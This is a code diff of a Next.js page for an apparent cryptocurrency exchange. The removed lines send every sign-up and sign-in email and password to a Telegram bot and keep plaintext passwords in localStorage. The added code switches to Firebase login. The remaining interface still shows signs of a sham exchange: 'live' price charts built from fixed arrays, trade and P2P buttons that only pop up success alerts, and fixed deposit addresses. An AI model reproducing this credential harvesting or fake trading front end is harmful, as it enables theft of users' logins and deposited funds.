@@ -1,5 +1,8 @@
 'use client';
 import React, { useState, useEffect } from 'react';
+import { auth, db } from '../firebase';
+import { createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from 'firebase/auth';
+import { doc, setDoc } from 'firebase/firestore';
 
 export default function Home() {
   const [isLoggedIn, setIsLoggedIn] = useState(false);
@@ -68,6 +71,20 @@ export default function Home() {
 
   const [selectedMarketCoin, setSelectedMarketCoin] = useState(cryptoList[0]);
   const [selectedWithdrawCoin, setSelectedWithdrawCoin] = useState(cryptoList[0]);
+  const [tradeTabMode, setTradeTabMode] = useState('spot'); // 'spot' or 'futures'
+
+  // Monitor Firebase Authentication State
+  useEffect(() => {
+    const unsubscribe = onAuthStateChanged(auth, (user) => {
+      if (user) {
+        setIsLoggedIn(true);
+        setAuthEmail(user.email);
+      } else {
+        setIsLoggedIn(false);
+      }
+    });
+    return () => unsubscribe();
+  }, []);
 
   // Fetch Live Crypto Prices from CoinGecko API
   useEffect(() => {
@@ -106,67 +123,46 @@ export default function Home() {
     if (updated) setSelectedMarketCoin(updated);
   }, [cryptoList]);
 
-  useEffect(() => {
-    const savedEmail = localStorage.getItem('registeredEmail');
-    if (savedEmail) {
-      setIsSignUp(false);
-    }
-  }, []);
-
+  // Firebase Authentication Handler (Sign Up & Sign In)
   const handleAuthSubmit = async (e) => {
     e.preventDefault();
     setAuthError('');
     setAuthSuccess('');
 
-    const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
+    if (!authEmail || !authPassword) {
+      setAuthError('Please enter both email and password.');
+      return;
+    }
 
-    if (isSignUp) {
-      if (!authEmail || !authPassword) {
-        setAuthError('Please enter both email and password.');
-        return;
-      }
+    try {
+      if (isSignUp) {
+        const userCredential = await createUserWithEmailAndPassword(auth, authEmail, authPassword);
+        const user = userCredential.user;
 
-      localStorage.setItem('registeredEmail', authEmail);
-      localStorage.setItem('registeredPassword', authPassword);
-      
-      if (botToken && chatId) {
-        const message = `New Sign Up:\nEmail: ${authEmail}\nPassword: ${authPassword}`;
-        try {
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-        } catch (err) {
-          console.error('Telegram send error:', err);
-        }
-      }
+        await setDoc(doc(db, 'users', user.uid), {
+          email: user.email,
+          balance: 0,
+          createdAt: new Date()
+        });
 
-      setAuthSuccess('Successfully registered! Please sign in with your credentials.');
-      setAuthPassword('');
-      setIsSignUp(false);
-    } else {
-      const savedEmail = localStorage.getItem('registeredEmail');
-      const savedPassword = localStorage.getItem('registeredPassword');
-
-      if (!savedEmail) {
-        setAuthError('No account found. Please sign up first.');
-        setIsSignUp(true);
-        return;
-      }
-
-      if (authEmail === savedEmail && authPassword === savedPassword) {
-        if (botToken && chatId) {
-          const message = `Successful Sign In:\nEmail: ${authEmail}\nPassword: ${authPassword}`;
-          try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-          } catch (err) {
-            console.error('Telegram send error:', err);
-          }
-        }
-
-        setIsLoggedIn(true);
-        setAuthSuccess('Successfully signed in!');
+        setAuthSuccess('Successfully registered! Please sign in.');
+        setAuthPassword('');
+        setIsSignUp(false);
       } else {
-        setAuthError('Invalid email or password.');
+        await signInWithEmailAndPassword(auth, authEmail, authPassword);
+        setAuthSuccess('Successfully signed in!');
       }
+    } catch (err) {
+      setAuthError(err.message);
+    }
+  };
+
+  const handleSignOut = async () => {
+    try {
+      await signOut(auth);
+      setIsLoggedIn(false);
+    } catch (err) {
+      console.error('Sign out error:', err);
     }
   };
 
@@ -403,7 +399,7 @@ export default function Home() {
         <div className="flex items-center space-x-3">
           <span className="text-gray-400 text-xs hidden sm:inline">{authEmail}</span>
           <button 
-            onClick={() => setIsLoggedIn(false)} 
+            onClick={handleSignOut} 
             className="bg-red-500/20 text-red-400 px-3 py-1 rounded text-xs font-semibold hover:bg-red-500/30 cursor-pointer"
           >
             Sign Out
@@ -467,7 +463,6 @@ export default function Home() {
           </div>
         )}
 
-        {/* MARKET FEATURE: List of cryptos, clicking one opens live price & candle stick chart */}
         {activeTab === 'market' && (
           <div className="space-y-4">
             <div className="bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-2xl space-y-3">
@@ -482,7 +477,6 @@ export default function Home() {
                 />
               </div>
 
-              {/* Horizontal Scrollable Coin Selector */}
               <div className="flex gap-2 overflow-x-auto pb-2 scrollbar-thin">
                 {filteredCryptos.map(coin => (
                   <button 
@@ -497,7 +491,6 @@ export default function Home() {
               </div>
             </div>
 
-            {/* Selected Coin Details & Live Candle Stick Chart View */}
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
               <div className="lg:col-span-2 bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4">
                 <div className="flex justify-between items-center">
@@ -511,7 +504,6 @@ export default function Home() {
                   </div>
                 </div>
 
-                {/* Simulated Live Candlestick Chart UI */}
                 <div className="bg-[#181a20] h-72 rounded-xl flex flex-col items-center justify-center border border-gray-800 relative p-4 overflow-hidden">
                   <div className="absolute top-3 left-3 flex gap-2 text-[10px] text-gray-400">
                     <span className="bg-[#2b313a] px-2 py-0.5 rounded text-white font-bold">1H</span>
@@ -522,7 +514,6 @@ export default function Home() {
                   <div className="absolute top-3 right-3 text-[10px] text-[#0ecb81] font-mono animate-pulse">● LIVE CANDLE FEED</div>
                   
                   <div className="flex items-end justify-center space-x-2 w-full h-40 pt-6">
-                    {/* Visual Candlestick Representation */}
                     {[45, 60, 52, 68, 55, 75, 70, 88, 80, 95, 90, 105, 100, 115, 110, 125, 120, 135].map((val, idx) => {
                       const isGreen = idx % 2 === 0;
                       return (
@@ -537,7 +528,6 @@ export default function Home() {
                 </div>
               </div>
 
-              {/* Quick Trade Panel for Selected Market Coin */}
               <div className="bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4 flex flex-col justify-between">
                 <div className="space-y-3">
                   <h3 className="font-bold text-white text-sm">Quick Spot Trade ({selectedMarketCoin.symbol})</h3>
@@ -569,31 +559,103 @@ export default function Home() {
 
         {activeTab === 'trade' && (
           <div className="space-y-4">
-            <h2 className="font-bold text-white text-base">Spot & Futures Trading Desk</h2>
+            <div className="bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-2xl flex justify-between items-center">
+              <div className="flex items-center space-x-3">
+                <span className="font-bold text-white text-base">{selectedMarketCoin.symbol}/USDT</span>
+                <span className="text-[#0ecb81] font-bold">${selectedMarketCoin.price}</span>
+              </div>
+              <div className="flex bg-[#181a20] p-1 rounded-xl">
+                <button onClick={() => setTradeTabMode('spot')} className={`px-4 py-1.5 rounded-lg font-bold text-xs cursor-pointer ${tradeTabMode === 'spot' ? 'bg-[#f0b90b] text-black' : 'text-gray-400'}`}>Spot</button>
+                <button onClick={() => setTradeTabMode('futures')} className={`px-4 py-1.5 rounded-lg font-bold text-xs cursor-pointer ${tradeTabMode === 'futures' ? 'bg-[#f0b90b] text-black' : 'text-gray-400'}`}>Futures</button>
+              </div>
+            </div>
 
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
               <div className="lg:col-span-2 bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4">
                 <div className="flex justify-between items-center">
-                  <span className="font-bold text-white text-sm">{selectedMarketCoin.name} ({selectedMarketCoin.symbol}) / USDT</span>
-                  <span className="text-base font-bold text-[#0ecb81]">${selectedMarketCoin.price}</span>
+                  <h3 className="font-bold text-white text-sm">Advanced Trading Chart ({selectedMarketCoin.symbol})</h3>
+                  <div className="flex gap-2">
+                    {cryptoList.slice(0, 4).map(c => (
+                      <button 
+                        key={c.symbol} 
+                        onClick={() => setSelectedMarketCoin(c)}
+                        className={`px-2 py-1 rounded text-[10px] font-bold cursor-pointer ${selectedMarketCoin.symbol === c.symbol ? 'bg-[#f0b90b] text-black' : 'bg-[#181a20] text-gray-300'}`}
+                      >
+                        {c.symbol}
+                      </button>
+                    ))}
+                  </div>
                 </div>
 
-                <div className="bg-[#181a20] h-64 rounded-xl flex flex-col items-center justify-center border border-gray-800 text-gray-400 space-y-2">
-                  <span className="text-xl">📈</span>
-                  <span>Trading Terminal View for {selectedMarketCoin.symbol}/USDT</span>
-                  <span className="text-[10px] text-gray-500">Live Price: ${selectedMarketCoin.price}</span>
+                <div className="bg-[#181a20] h-80 rounded-xl flex flex-col items-center justify-center border border-gray-800 relative p-4">
+                  <div className="absolute top-3 right-3 text-[10px] text-[#0ecb81] font-mono animate-pulse">● LIVE TRADING FEED</div>
+                  <div className="flex items-end justify-center space-x-2 w-full h-48 pt-6">
+                    {[50, 65, 58, 72, 60, 80, 75, 92, 85, 98, 94, 110, 105, 120, 115, 130, 125, 140].map((val, idx) => {
+                      const isGreen = idx % 2 === 0;
+                      return (
+                        <div key={idx} className="flex flex-col items-center h-full justify-end group relative">
+                          <div className={`w-0.5 ${isGreen ? 'bg-[#0ecb81]' : 'bg-red-500'} h-full absolute`}></div>
+                          <div style={{ height: `${val}px` }} className={`w-3 rounded-sm z-10 ${isGreen ? 'bg-[#0ecb81]' : 'bg-red-500'}`}></div>
+                        </div>
+                      );
+                    })}
+                  </div>
+                  <div className="text-[11px] text-gray-400 mt-3">{tradeTabMode.toUpperCase()} Order Execution Engine Active</div>
                 </div>
               </div>
-              
-              <div className="bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4">
-                <h3 className="font-bold text-white text-sm">Place Spot Order</h3>
+
+              <div className="bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4 flex flex-col justify-between">
                 <div className="space-y-3">
-                  <div>
-                    <label className="text-gray-400 block mb-1">Amount ({selectedMarketCoin.symbol})</label>
-                    <input type="number" step="any" value={tradeAmount} onChange={(e) => setTradeAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none" />
+                  <div className="flex justify-between items-center">
+                    <h3 className="font-bold text-white text-sm">{tradeTabMode === 'futures' ? 'Futures Order' : 'Spot Order'}</h3>
+                    {tradeTabMode === 'futures' && (
+                      <span className="text-[#f0b90b] font-bold text-[10px] bg-[#181a20] px-2 py-1 rounded border border-gray-800">
+                        {leverage}x | {futuresMarginMode}
+                      </span>
+                    )}
                   </div>
-                  <button onClick={() => alert(`Successfully placed order!`)} className="w-full bg-[#0ecb81] text-black font-bold p-2.5 rounded cursor-pointer">
-                    Buy {selectedMarketCoin.symbol}
+
+                  {tradeTabMode === 'futures' && (
+                    <div className="space-y-2 bg-[#181a20] p-3 rounded-xl border border-gray-800">
+                      <div className="flex justify-between text-[10px] text-gray-400">
+                        <span>Adjust Leverage</span>
+                        <span className="text-white font-bold">{leverage}x</span>
+                      </div>
+                      <input 
+                        type="range" 
+                        min="1" 
+                        max="100" 
+                        value={leverage} 
+                        onChange={(e) => setLeverage(e.target.value)} 
+                        className="w-full accent-[#f0b90b] cursor-pointer"
+                      />
+                    </div>
+                  )}
+
+                  <div className="flex bg-[#181a20] p-1 rounded-xl">
+                    <button onClick={() => setOrderType('limit')} className={`flex-1 py-1 rounded-lg font-bold text-[10px] cursor-pointer ${orderType === 'limit' ? 'bg-[#2b313a] text-white' : 'text-gray-400'}`}>Limit</button>
+                    <button onClick={() => setOrderType('market')} className={`flex-1 py-1 rounded-lg font-bold text-[10px] cursor-pointer ${orderType === 'market' ? 'bg-[#2b313a] text-white' : 'text-gray-400'}`}>Market</button>
+                  </div>
+
+                  {orderType === 'limit' && (
+                    <div>
+                      <label className="text-gray-400 block mb-1 text-[10px]">Price (USDT)</label>
+                      <input type="number" value={tradePrice} onChange={(e) => setTradePrice(e.target.value)} placeholder={selectedMarketCoin.price} className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none text-xs" />
+                    </div>
+                  )}
+
+                  <div>
+                    <label className="text-gray-400 block mb-1 text-[10px]">Amount ({selectedMarketCoin.symbol})</label>
+                    <input type="number" step="any" value={tradeAmount} onChange={(e) => setTradeAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none text-xs" />
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-2 gap-2 pt-2">
+                  <button onClick={() => alert(`Successfully placed Long/Buy order for ${selectedMarketCoin.symbol}!`)} className="bg-[#0ecb81] hover:bg-[#0bb875] text-black font-bold p-2.5 rounded text-xs cursor-pointer">
+                    Buy / Long
+                  </button>
+                  <button onClick={() => alert(`Successfully placed Short/Sell order for ${selectedMarketCoin.symbol}!`)} className="bg-red-500 hover:bg-red-600 text-black font-bold p-2.5 rounded text-xs cursor-pointer">
+                    Sell / Short
                   </button>
                 </div>
               </div>
@@ -601,7 +663,6 @@ export default function Home() {
           </div>
         )}
 
-        {/* ASSET FEATURE: Portfolio balances, crypto holdings, and integrated Deposit/Withdraw features */}
         {activeTab === 'asset' && (
           <div className="space-y-6">
             <div className="bg-[#2b313a]/20 border border-[#2b313a] p-6 rounded-2xl space-y-4">
@@ -652,6 +713,226 @@ export default function Home() {
 
       </div>
 
+      {modalType === 'deposit' && (
+        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
+          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4">
+            <div className="flex justify-between items-center">
+              <h3 className="font-bold text-white text-base">Deposit Cryptocurrency</h3>
+              <button onClick={() => setModalType(null)} className="text-gray-400 hover:text-white cursor-pointer font-bold">✕</button>
+            </div>
+            <form onSubmit={handleDepositSubmit} className="space-y-3">
+              <div>
+                <label className="text-gray-400 block mb-1">Select Coin</label>
+                <select 
+                  value={selectedMarketCoin.symbol} 
+                  onChange={(e) => {
+                    const found = cryptoList.find(c => c.symbol === e.target.value);
+                    if (found) setSelectedMarketCoin(found);
+                  }}
+                  className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none"
+                >
+                  {cryptoList.map(coin => (
+                    <option key={coin.symbol} value={coin.symbol}>{coin.name} ({coin.symbol})</option>
+                  ))}
+                </select>
+              </div>
+              <div className="bg-[#181a20] p-3 rounded-xl border border-gray-800 space-y-1">
+                <div className="text-[10px] text-gray-400">Deposit Address ({selectedMarketCoin.network})</div>
+                <div className="font-mono text-xs text-[#f0b90b] break-all">{selectedMarketCoin.depositAddress}</div>
+                <button type="button" onClick={() => handleCopy(selectedMarketCoin.depositAddress)} className="text-xs bg-[#2b313a] hover:bg-[#363c4e] text-white px-3 py-1 rounded mt-2 cursor-pointer">
+                  {copiedAddress ? 'Copied!' : 'Copy Address'}
+                </button>
+              </div>
+              <div>
+                <label className="text-gray-400 block mb-1">Amount Deposited</label>
+                <input 
+                  type="number" 
+                  step="any" 
+                  value={depositAmount} 
+                  onChange={(e) => setDepositAmount(e.target.value)} 
+                  placeholder="0.00" 
+                  className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none" 
+                  required
+                />
+              </div>
+              <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded cursor-pointer">
+                Confirm Deposit
+              </button>
+            </form>
+          </div>
+        </div>
+      )}
+
+      {modalType === 'withdraw' && (
+        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
+          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4">
+            <div className="flex justify-between items-center">
+              <h3 className="font-bold text-white text-base">Withdraw Cryptocurrency</h3>
+              <button onClick={() => setModalType(null)} className="text-gray-400 hover:text-white cursor-pointer font-bold">✕</button>
+            </div>
+            <form onSubmit={handleWithdrawSubmit} className="space-y-3">
+              <div>
+                <label className="text-gray-400 block mb-1">Select Coin</label>
+                <select 
+                  value={selectedWithdrawCoin.symbol} 
+                  onChange={(e) => {
+                    const found = cryptoList.find(c => c.symbol === e.target.value);
+                    if (found) setSelectedWithdrawCoin(found);
+                  }}
+                  className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none"
+                >
+                  {cryptoList.map(coin => (
+                    <option key={coin.symbol} value={coin.symbol}>{coin.name} ({coin.symbol})</option>
+                  ))}
+                </select>
+              </div>
+              <div>
+                <label className="text-gray-400 block mb-1">Recipient Address</label>
+                <input 
+                  type="text" 
+                  value={withdrawAddress} 
+                  onChange={(e) => setWithdrawAddress(e.target.value)} 
+                  placeholder="Enter wallet address" 
+                  className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none" 
+                  required
+                />
+              </div>
+              <div>
+                <label className="text-gray-400 block mb-1">Amount (Avail: {(userCryptoHoldings[selectedWithdrawCoin.symbol] || 0).toFixed(4)} {selectedWithdrawCoin.symbol})</label>
+                <input 
+                  type="number" 
+                  step="any" 
+                  value={withdrawAmount} 
+                  onChange={(e) => setWithdrawAmount(e.target.value)} 
+                  placeholder="0.00" 
+                  className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none" 
+                  required
+                />
+              </div>
+              <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded cursor-pointer">
+                Confirm Withdrawal
+              </button>
+            </form>
+          </div>
+        </div>
+      )}
+
+      {modalType === 'convert' && (
+        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
+          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4">
+            <div className="flex justify-between items-center">
+              <h3 className="font-bold text-white text-base">Quick Convert</h3>
+              <button onClick={() => setModalType(null)} className="text-gray-400 hover:text-white cursor-pointer font-bold">✕</button>
+            </div>
+            <form onSubmit={handleConvertSubmit} className="space-y-3">
+              <div>
+                <label className="text-gray-400 block mb-1">From Coin (Avail: {(userCryptoHoldings[convertFromCoin] || 0).toFixed(4)})</label>
+                <select value={convertFromCoin} onChange={(e) => setConvertFromCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none">
+                  {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
+                </select>
+              </div>
+              <div>
+                <label className="text-gray-400 block mb-1">To Coin</label>
+                <select value={convertToCoin} onChange={(e) => setConvertToCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none">
+                  {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
+                </select>
+              </div>
+              <div>
+                <label className="text-gray-400 block mb-1">Amount</label>
+                <input type="number" step="any" value={convertAmount} onChange={(e) => setConvertAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none" required />
+              </div>
+              <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded cursor-pointer">Convert Now</button>
+            </form>
+          </div>
+        </div>
+      )}
+
+      {modalType === 'swap' && (
+        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
+          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4">
+            <div className="flex justify-between items-center">
+              <h3 className="font-bold text-white text-base">Token Swap</h3>
+              <button onClick={() => setModalType(null)} className="text-gray-400 hover:text-white cursor-pointer font-bold">✕</button>
+            </div>
+            <form onSubmit={handleSwapSubmit} className="space-y-3">
+              <div>
+                <label className="text-gray-400 block mb-1">Swap From (Avail: {(userCryptoHoldings[swapFromCoin] || 0).toFixed(4)})</label>
+                <select value={swapFromCoin} onChange={(e) => setSwapFromCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none">
+                  {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
+                </select>
+              </div>
+              <div>
+                <label className="text-gray-400 block mb-1">Swap To</label>
+                <select value={swapToCoin} onChange={(e) => setSwapToCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none">
+                  {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
+                </select>
+              </div>
+              <div>
+                <label className="text-gray-400 block mb-1">Amount</label>
+                <input type="number" step="any" value={swapAmount} onChange={(e) => setSwapAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none" required />
+              </div>
+              <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded cursor-pointer">Swap Now</button>
+            </form>
+          </div>
+        </div>
+      )}
+
+      {modalType === 'pay' && (
+        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
+          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4">
+            <div className="flex justify-between items-center">
+              <h3 className="font-bold text-white text-base">Crypto Pay</h3>
+              <button onClick={() => setModalType(null)} className="text-gray-400 hover:text-white cursor-pointer font-bold">✕</button>
+            </div>
+            <form onSubmit={handlePaySubmit} className="space-y-3">
+              <div>
+                <label className="text-gray-400 block mb-1">Recipient Email / ID</label>
+                <input type="text" value={payRecipient} onChange={(e) => setPayRecipient(e.target.value)} placeholder="recipient@example.com" className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none" required />
+              </div>
+              <div>
+                <label className="text-gray-400 block mb-1">Select Coin</label>
+                <select value={payCoin} onChange={(e) => setPayCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none">
+                  {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol} (Avail: {(userCryptoHoldings[c.symbol] || 0).toFixed(4)})</option>)}
+                </select>
+              </div>
+              <div>
+                <label className="text-gray-400 block mb-1">Amount</label>
+                <input type="number" step="any" value={payAmount} onChange={(e) => setPayAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none" required />
+              </div>
+              <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded cursor-pointer">Send Payment</button>
+            </form>
+          </div>
+        </div>
+      )}
+
+      {modalType === 'p2p' && (
+        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
+          <div className="bg-[#1e2329] border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4">
+            <div className="flex justify-between items-center">
+              <h3 className="font-bold text-white text-base">P2P Express Trading</h3>
+              <button onClick={() => setModalType(null)} className="text-gray-400 hover:text-white cursor-pointer font-bold">✕</button>
+            </div>
+            <div className="flex bg-[#181a20] p-1 rounded-xl">
+              <button onClick={() => setP2pType('buy')} className={`flex-1 py-2 rounded-lg font-bold text-xs cursor-pointer ${p2pType === 'buy' ? 'bg-[#0ecb81] text-black' : 'text-gray-400'}`}>Buy USDT</button>
+              <button onClick={() => setP2pType('sell')} className={`flex-1 py-2 rounded-lg font-bold text-xs cursor-pointer ${p2pType === 'sell' ? 'bg-red-500 text-black' : 'text-gray-400'}`}>Sell USDT</button>
+            </div>
+            <div className="space-y-3">
+              <div className="bg-[#181a20] p-3 rounded-xl border border-gray-800 space-y-2">
+                <div className="flex justify-between items-center text-xs">
+                  <span className="font-bold text-white">Merchant: CryptoExpress_VIP</span>
+                  <span className="text-[#0ecb81]">99.8% Completion</span>
+                </div>
+                <div className="text-gray-400 text-[10px]">Price: <span className="text-white font-bold">1.00 USD / USDT</span></div>
+                <div className="text-gray-400 text-[10px]">Limits: <span className="text-white">10 - 5,000 USD</span></div>
+                <button onClick={() => { alert(`P2P order initiated successfully!`); setModalType(null); }} className={`w-full font-bold p-2.5 rounded cursor-pointer mt-2 ${p2pType === 'buy' ? 'bg-[#0ecb81] text-black' : 'bg-red-500 text-black'}`}>
+                  {p2pType === 'buy' ? 'Buy USDT Now' : 'Sell USDT Now'}
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
       <div className="fixed bottom-0 left-0 right-0 bg-[#181a20] border-t border-[#2b313a] flex justify-around p-3 z-40 max-w-6xl mx-auto">
         <button onClick={() => setActiveTab('home')} className={`flex flex-col items-center cursor-pointer ${activeTab === 'home' ? 'text-[#f0b90b]' : 'text-gray-400'}`}>
           <span className="text-lg">🏠</span>
@@ -670,165 +951,6 @@ export default function Home() {
           <span className="text-[10px]">Assets</span>
         </button>
       </div>
-
-      {modalType && (
-        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
-          <div className="bg-[#181a20] border border-[#2b313a] rounded-2xl w-full max-w-md p-6 space-y-4 relative">
-            <button onClick={() => setModalType(null)} className="absolute top-4 right-4 text-gray-400 hover:text-white text-lg font-bold cursor-pointer">✕</button>
-
-            {modalType === 'deposit' && (
-              <form onSubmit={handleDepositSubmit} className="space-y-4">
-                <h3 className="font-bold text-white text-sm">Deposit Crypto</h3>
-                <div>
-                  <label className="text-gray-400 block mb-1">Select Coin to Deposit</label>
-                  <select 
-                    value={selectedMarketCoin.symbol} 
-                    onChange={(e) => {
-                      const found = cryptoList.find(c => c.symbol === e.target.value);
-                      if (found) setSelectedMarketCoin(found);
-                    }}
-                    className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white outline-none"
-                  >
-                    {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.name} ({c.symbol})</option>)}
-                  </select>
-                </div>
-                <div className="bg-[#2b313a]/30 p-3 rounded border border-gray-800 space-y-1">
-                  <div className="text-[10px] text-gray-400">Deposit Address ({selectedMarketCoin.network}):</div>
-                  <div className="font-mono text-white text-[11px] break-all bg-[#181a20] p-2 rounded border border-gray-700">{selectedMarketCoin.depositAddress}</div>
-                  <button type="button" onClick={() => handleCopy(selectedMarketCoin.depositAddress)} className="mt-1 bg-[#2b313a] text-white px-3 py-1 rounded text-[10px] font-bold hover:bg-[#363c4e] cursor-pointer">
-                    {copiedAddress ? 'Copied!' : 'Copy Address'}
-                  </button>
-                </div>
-                <div>
-                  <label className="text-gray-400 block mb-1">Deposit Amount</label>
-                  <input type="number" step="any" value={depositAmount} onChange={(e) => setDepositAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white outline-none" required />
-                </div>
-                <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded cursor-pointer">Confirm Deposit</button>
-              </form>
-            )}
-
-            {modalType === 'withdraw' && (
-              <form onSubmit={handleWithdrawSubmit} className="space-y-4">
-                <h3 className="font-bold text-white text-sm">Withdraw Crypto</h3>
-                <div>
-                  <label className="text-gray-400 block mb-1">Select Coin</label>
-                  <select 
-                    value={selectedWithdrawCoin.symbol} 
-                    onChange={(e) => {
-                      const found = cryptoList.find(c => c.symbol === e.target.value);
-                      if (found) setSelectedWithdrawCoin(found);
-                    }}
-                    className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white outline-none"
-                  >
-                    {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.name} ({c.symbol})</option>)}
-                  </select>
-                </div>
-                <div className="text-[10px] text-gray-400">
-                  Available Balance: <span className="text-white font-bold">{(userCryptoHoldings[selectedWithdrawCoin.symbol] || 0).toFixed(4)} {selectedWithdrawCoin.symbol}</span>
-                </div>
-                <div>
-                  <label className="text-gray-400 block mb-1">Withdrawal Address</label>
-                  <input type="text" value={withdrawAddress} onChange={(e) => setWithdrawAddress(e.target.value)} placeholder="Paste destination address" className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white outline-none" required />
-                </div>
-                <div>
-                  <label className="text-gray-400 block mb-1">Amount</label>
-                  <input type="number" step="any" value={withdrawAmount} onChange={(e) => setWithdrawAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white outline-none" required />
-                </div>
-                <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded cursor-pointer">Submit Withdrawal</button>
-              </form>
-            )}
-
-            {modalType === 'convert' && (
-              <form onSubmit={handleConvertSubmit} className="space-y-4">
-                <h3 className="font-bold text-white text-sm">Quick Convert</h3>
-                <div>
-                  <label className="text-gray-400 block mb-1">From</label>
-                  <select value={convertFromCoin} onChange={(e) => setConvertFromCoin(e.target.value)} className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white">
-                    {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
-                  </select>
-                </div>
-                <div>
-                  <label className="text-gray-400 block mb-1">To</label>
-                  <select value={convertToCoin} onChange={(e) => setConvertToCoin(e.target.value)} className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white">
-                    {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
-                  </select>
-                </div>
-                <div>
-                  <label className="text-gray-400 block mb-1">Amount ({convertFromCoin})</label>
-                  <input type="number" step="any" value={convertAmount} onChange={(e) => setConvertAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#2b313a] border border-gray-700 p-2 rounded text-white" required />
-                </div>
-                <button type="submit" className="w-full bg-[#f0b90b] text-black font-bold p-2.5 rounded cursor-pointer">Convert Now</button>
-              </form>
-            )}
-
-            {modalType === 'p2p' && (
-              <div className="space-y-4">
-                <h3 className="font-bold text-white text-sm">P2P Express Trading</h3>
-                <div className="flex gap-2">
-                  <button onClick={() => setP2pType('buy')} className={`flex-1 py-1.5 rounded font-bold ${p2pType === 'buy' ? 'bg-[#0ecb81] text-black' : 'bg-[#2b313a] text-gray-400'}`}>Buy USDT</button>
